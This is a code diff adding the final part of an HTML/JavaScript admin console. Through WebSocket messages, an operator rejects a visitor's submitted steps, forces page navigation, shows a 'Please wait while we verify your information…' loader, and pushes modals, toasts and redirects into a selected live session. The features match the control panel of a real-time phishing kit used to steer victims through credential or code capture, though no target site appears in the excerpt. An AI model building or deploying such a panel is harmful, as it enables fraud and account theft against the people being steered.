+  if(!sid&&!selectedId){toast('Select a session','warn');return;}
+  _rejectSid=sid||selectedId;
+  _rejectStep=stepType||null;
+  document.getElementById('rmMeta').textContent=`Rejecting: ${STEP_LABELS[stepType]||stepType||'step'}`;
+  document.getElementById('rmPreset').value='';
+  document.getElementById('rmReason').value='';
+  document.getElementById('rejectModal').classList.add('open');
+};
+window.closeReject=function(){document.getElementById('rejectModal').classList.remove('open');};
+window.applyPreset=function(){
+  const v=document.getElementById('rmPreset').value;
+  if(v&&v!=='custom')document.getElementById('rmReason').value=v;
+};
+window.submitReject=function(){
+  const reason=document.getElementById('rmReason').value.trim();
+  if(!reason){toast('Enter a reason','warn');return;}
+  if(!_rejectSid||!_rejectStep){
+    // Find first pending
+    const cards=document.querySelectorAll('.sub-card.pending');
+    if(!cards.length){toast('No pending step','warn');closeReject();return;}
+    // Extract from first card
+    const btn=cards[0].querySelector('.btn-rj');
+    if(btn){const oc=btn.getAttribute('onclick');/* fallback */}
+  }
+  wsSend({type:'admin_reject_step',sessionId:_rejectSid,stepType:_rejectStep,reason});
+  toast('Rejection sent','warn');
+  closeReject();
+};
+
+window.forceNav=function(){
+  if(!selectedId){toast('Select a session','warn');return;}
+  const checked=document.querySelector('input[name="nav"]:checked');
+  if(!checked){toast('Select a target','warn');return;}
+  const payload={target_page:checked.dataset.page};
+  if(checked.dataset.screen)payload.target_screen=checked.dataset.screen;
+  wsSend({type:'admin_force_navigate',sessionId:selectedId,payload});
+  toast('Layout pushed','info');
+};
+
+window.toggleLoader=function(){
+  if(!selectedId){toast('Select a session','warn');return;}
+  _loaderOn=!_loaderOn;
+  wsSend({type:'admin_force_loader',sessionId:selectedId,action:_loaderOn?'show':'hide',message:'Please wait while we verify your information…'});
+  const b=document.getElementById('loaderBtn');
+  b.innerHTML=_loaderOn?'<i class="fas fa-circle-notch fa-spin"></i> Hide Loader':'<i class="fas fa-circle-notch"></i> Show Loader';
+  toast(_loaderOn?'Loader shown':'Loader hidden','info');
+};
+
+window.pushModal=function(){
+  if(!selectedId){toast('Select a session','warn');return;}
+  const title=document.getElementById('mTitle').value;
+  const message=document.getElementById('mBody').value;
+  const closeable=document.getElementById('mClose').checked;
+  if(!message){toast('Enter a message','warn');return;}
+  wsSend({type:'admin_force_modal',sessionId:selectedId,payload:{title,message,closeable}});
+  toast('Modal pushed','ok');
+};
+
+window.sendCmd=function(type,extraPayload){
+  if(!selectedId){toast('Select a session','warn');return;}
+  wsSend({type,sessionId:selectedId,...(extraPayload?{payload:extraPayload}:{}),message:extraPayload?.message});
+  toast(`Sent: ${type.replace('admin_','')}`,'info');
+};
+
+window.pushRedirect=function(){
+  if(!selectedId){toast('Select a session','warn');return;}
+  const url=document.getElementById('rUrl').value.trim();
+  const message=document.getElementById('rMsg').value.trim();
+  if(!url){toast('Enter a URL','warn');return;}
+  if(!url.startsWith('http')){toast('URL must start with http','warn');return;}
+  wsSend({type:'admin_redirect',sessionId:selectedId,payload:{url,message}});
+  toast('Redirect pushed','ok');
+};
+
+window.sendToast=function(type,text){
+  if(!selectedId){toast('Select a session','warn');return;}
+  wsSend({type:'admin_send_toast',sessionId:selectedId,payload:{type,text}});
+  toast('Toast sent','info');
+};
+
+// ════════════════════════════════════════════
+//  API HELPER
+// ════════════════════════════════════════════
+async function apiFetch(path){
+  const r=await fetch(BACKEND+path,{headers:{'Authorization':`Bearer ${KEY}`,'Content-Type':'application/json'}});
+  if(!r.ok)throw new Error(`HTTP ${r.status}`);
+  return r.json();
+}
+
+// ════════════════════════════════════════════
+//  UTILS
+// ════════════════════════════════════════════
+function esc(s){if(!s)return'';const d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
+function timeAgo(iso){if(!iso)return'—';const d=(Date.now()-new Date(iso).getTime())/1000;if(d<60)return'now';if(d<3600)return Math.floor(d/60)+'m';if(d<86400)return Math.floor(d/3600)+'h';return Math.floor(d/86400)+'d';}
+
+window.copyF=function(id){
+  const el=document.getElementById(id);if(!el)return;
+  navigator.clipboard.writeText(el.textContent).then(()=>toast('Copied','ok',1500)).catch(()=>{});
+};
+
+function flashCard(sid){
+  const el=document.querySelector(`[onclick="selectSession('${sid}')"]`);
+  if(!el)return;
+  el.style.background='rgba(245,158,11,.12)';
+  setTimeout(()=>{el.style.background='';},800);
+}
+
+let _tt;
+function toast(m,type,dur){
+  const t=document.getElementById('toast');
+  t.textContent=m;t.className='show '+(type||'info');
+  clearTimeout(_tt);_tt=setTimeout(()=>{t.className='';},dur||3000);
+}
+window.toast=toast;
+
+// Close reject on backdrop
+document.getElementById('rejectModal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeReject();});
+
+})();
+</script>
+</body>
+</html>
